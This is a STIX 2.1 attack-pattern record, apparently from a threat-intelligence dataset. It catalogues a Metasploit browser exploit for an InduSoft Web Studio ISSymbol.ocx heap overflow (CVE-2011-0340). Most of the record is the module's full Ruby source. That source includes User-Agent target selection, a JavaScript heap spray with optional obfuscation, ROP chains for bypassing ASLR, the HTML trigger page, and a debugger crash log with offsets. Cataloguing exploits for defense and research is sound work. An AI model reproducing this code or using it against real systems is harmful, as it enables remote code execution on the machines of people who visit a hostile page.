{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff7e0f9f-ffbf-40cb-a2b6-f0e076d2f2bd",
    "created": "2024-08-14T16:43:10.709618Z",
    "modified": "2024-08-14T16:43:10.709623Z",
    "name": "\"InduSoft Web Studio ISSymbol.ocx InternationalSeparator() Heap Overflow\"",
    "description": " This module exploits a heap overflow found in InduSoft Web Studio <= 61.6.00.00 SP6. The overflow exists in the ISSymbol.ocx, and can be triggered with a long string argument for the InternationalSeparator() method of the ISSymbol control. This module uses the msvcr71.dll form the Java JRE6 to bypass ASLR.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/indusoft_issymbol_internationalseparator.rb",
            "external_id": "indusoft_issymbol_internationalseparator.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0340"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20110506063846/http://secunia.com:80/secunia_research/2011-37"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{3c9dff6f-5cb0-422e-9978-d6405d10718f}\",\n  #  :method     => \"InternationalSeparator\"\n  #})\n\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"InduSoft Web Studio ISSymbol.ocx InternationalSeparator() Heap Overflow\",\n      'Description'    => %q{\n        This module exploits a heap overflow found in InduSoft Web Studio <= 61.6.00.00\n        SP6. The overflow exists in the ISSymbol.ocx, and can be triggered with a long\n        string argument for the InternationalSeparator() method of the ISSymbol control.\n        This module uses the msvcr71.dll form the Java JRE6 to bypass ASLR.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Alexander Gavrun', # Vulnerability discovery\n          'Dmitriy Pletnev', # Vulnerability discovery\n          'James Fitts <fitts.james[at]gmail.com>', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-0340' ],\n          [ 'OSVDB', '72865' ],\n          [ 'BID', '47596' ],\n          [ 'ZDI', '12-168' ],\n          [ 'URL', 'http://web.archive.org/web/20110506063846/http://secunia.com:80/secunia_research/2011-37' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'            => 934,\n          'DisableNops'      => true,\n          'PrependEncoder'   => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4' } ],\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5f4' } ],\n          [ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5fe' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    case my_target\n    when targets[7]\n      # IE 9 on Windows 7\n      js = %Q|\n      function randomblock(blocksize)\n      {\n        var theblock = \"\";\n        for (var i = 0; i < blocksize; i++)\n        {\n          theblock += Math.floor(Math.random()*90)+10;\n        }\n        return theblock;\n      }\n\n      function tounescape(block)\n      {\n        var blocklen = block.length;\n        var unescapestr = \"\";\n        for (var i = 0; i < blocklen-1; i=i+4)\n        {\n          unescapestr += \"%u\" + block.substring(i,i+4);\n        }\n        return unescapestr;\n      }\n\n      var heap_obj = new heapLib.ie(0x10000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_random_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset_length = #{my_target['Offset']};\n      for (var i=0; i < 0x1000; i++) {\n        var padding = unescape(tounescape(randomblock(0x1000)));\n        while (padding.length < 0x1000) padding+= padding;\n        var junk_offset = padding.substring(0, offset_length);\n        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n        heap_obj.alloc(sprayblock);\n      }\n      |\n\n    else\n      # For IE 6, 7, 8\n      js = %Q|\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n      |\n\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    if t['Rop'].nil?\n      prepend = [\n        0x0c0c0c0c,\n        0x0c0c0c0c,\n        0x0c0c0c0c,\n        0x0c0c0c0c,\n        0x0c0c0c0c,\n        0x0c0c0c0c,\n        0x0c0c0c28 # Will finally become EIP\n      ].pack(\"V*\")\n      return prepend + code\n    end\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      stack_pivot = [\n        0x0c0c0c0c, # ret from msvcrt.dll\n        0x77c15ed6, # ret from msvcrt.dll\n        0x77c15ed6, # ret from msvcrt.dll\n        0x77c15ed6, # ret from msvcrt.dll\n        0x77c15ed6, # ret from msvcrt.dll\n        0x77c1f519, # pop # ret from msvcrt.dll\n        0x77c4fa1a  # will become eip # mov esp, ebx # pop ebx # ret from msvcrt.dll\n      ].pack(\"V*\")\n      rop_payload = generate_rop_payload('msvcrt', code,  {'pivot'=>stack_pivot, 'target'=>'xp'})\n    else\n      print_status(\"Using JRE ROP\")\n      stack_pivot = [\n        0x0c0c0c0c, # ret from msvcr71.dll\n        0x7c376fff, # ret from msvcr71.dll\n        0x7c376fff, # ret from msvcr71.dll\n        0x7c376fff, # ret from msvcr71.dll\n        0x7c376fff, # ret from msvcr71.dll\n        0x7c376ffe, # pop # ret from msvcr71.dll\n        0x7c376ffc  # will become eip # mov esp, ebx # pop ebx # ret from msvcr71.dll\n      ].pack(\"V*\")\n      rop_payload = generate_rop_payload('java', code, {'pivot'=>stack_pivot})\n    end\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n\n    # ActiveX parameters\n    clsid = \"3c9dff6f-5cb0-422e-9978-d6405d10718f\"\n    name = rand_text_alpha(rand(50) + 1 )\n    boom = Rex::Text.to_unescape(\"\\x0c\" * 6888)\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:#{clsid}' id='#{name}'></object>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n    <script language='javascript'>\n    #{name}.InternationalSeparator(unescape(\"#{boom}\"));\n    </script>\n    </body></html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n=begin\neax=41306941 ebx=41306941 ecx=336b4632 edx=00000064 esi=064c0048 edi=00009796\neip=100127d2 esp=0013e60c ebp=0013e640 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nISSymbol!DllUnregisterServer+0xc9e2:\n100127d2 8b01            mov     eax,dword ptr [ecx]  ds:0023:336b4632=????????\n0:000> u eip\nISSymbol!DllUnregisterServer+0xc9e2:\n100127d2 8b01            mov     eax,dword ptr [ecx]\n100127d4 8b5018          mov     edx,dword ptr [eax+18h]\n100127d7 ffe2            jmp     edx\n100127d9 cc              int     3\n100127da cc              int     3\n100127db cc              int     3\n100127dc cc              int     3\n100127dd cc              int     3\n\n* ebx\n$ ruby pattern_offset.rb 41306941  6888\n[*] Exact match at offset 240\n\n* ecx\n$ ruby pattern_offset.rb 336b4632  6888\n[*] Exact match at offset 4208\n\n=end\n",
    "x_mitre_disclosure_date": "2012-04-28",
    "x_mitre_platforms": [
        "win'"
    ]
}